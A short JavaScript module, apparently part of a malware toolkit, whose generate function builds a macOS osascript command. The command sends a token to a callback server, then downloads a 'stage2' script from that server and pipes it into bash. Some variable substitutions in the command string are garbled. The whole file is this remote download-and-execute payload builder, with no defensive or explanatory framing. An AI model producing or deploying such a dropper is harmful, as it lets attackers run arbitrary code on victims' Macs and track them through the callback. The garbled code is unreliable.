function generate(token, serverUrl) {
    // Callback first, then pull + execute stage2
    const cmd = `curl -s -X POST -H 'Content-Type: application/json' -d '{\\"token\\":\\"${token}\\"}' \( {serverUrl}/api/callback >/dev/null 2>&1; curl -s ' \){serverUrl}/stage2?token=${token}' | bash`;
    return `osascript -e 'do shell script "${cmd}"'`;
}

module.exports = { generate };
